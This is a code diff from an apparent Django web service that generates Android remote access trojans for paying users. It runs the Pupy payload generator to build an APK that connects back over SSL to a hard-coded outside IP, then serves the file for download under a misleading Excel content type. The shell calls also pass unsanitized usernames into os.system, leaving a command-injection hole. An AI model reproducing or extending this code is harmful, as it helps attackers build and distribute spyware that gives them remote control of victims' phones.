@@ -23,20 +23,47 @@ def add(request):
         host='185.120.221.217:'+str(port)
         username = request.user.username
         dir = '/root/django/users/'+ str(username)+'/pupy/'+str(username)
+        app = '/root/django/users/'+ str(username)+'/pupy/'+str(username)+'.apk'
+
         d=os.system('mkdir /root/django/users/'+ str(username))
         d=os.system('mkdir /root/django/users/'+ str(username)+'/pupy')
         c=os.system('cd /root/django/pupy/pupy ;./pupygen.py -O android -o '+ str(dir)+'.apk connect --host '+str(host)+' --transport ssl')
         if c == 0:
             c = "Your rat created in "+ str(dir)+".apk"
+    ##down
+        username = request.user.username
+        file_path = app
+        if os.path.exists(file_path):
+            with open(file_path, 'rb') as fh:
+                response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
+                response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
+                return response
+
+
     else:
         c = 'you dont have credit'
     # Render the HTML template index.html with the data in the context variable
+
     return render(
         request,
-        'addrat.html',
+        'pupy/android/addrat.html',
         context={'c' : c
         },
     )
+
+
+
+def down(request):
+    username = request.user.username
+    dir = '/root/django/users/'+ str(username)+'/pupy/'+str(username)+'.apk'
+    file_path = dir
+    if os.path.exists(file_path):
+        with open(file_path, 'rb') as fh:
+            response = HttpResponse(fh.read(), content_type="application/vnd.ms-excel")
+            response['Content-Disposition'] = 'inline; filename=' + os.path.basename(file_path)
+            return response
+    raise Http404
+
 #///////////////// listeniing
 def listen(request):
     username = request.user.username
